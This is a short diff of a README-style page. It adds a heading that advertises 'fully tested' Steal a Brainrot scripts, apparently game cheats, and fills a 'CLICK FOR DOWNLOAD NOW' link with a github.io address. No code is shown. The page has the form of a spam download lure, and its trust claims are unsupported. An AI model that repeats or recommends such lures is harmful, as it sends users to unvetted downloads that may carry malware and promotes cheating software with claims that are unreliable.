@@ -1,10 +1,10 @@
-
+# where find Steal a Brainrot scripts 2026. Our trusted Steal a Brainrot scripts are fully tested and ready for use.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://catalog-avatar-creator-wd34.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
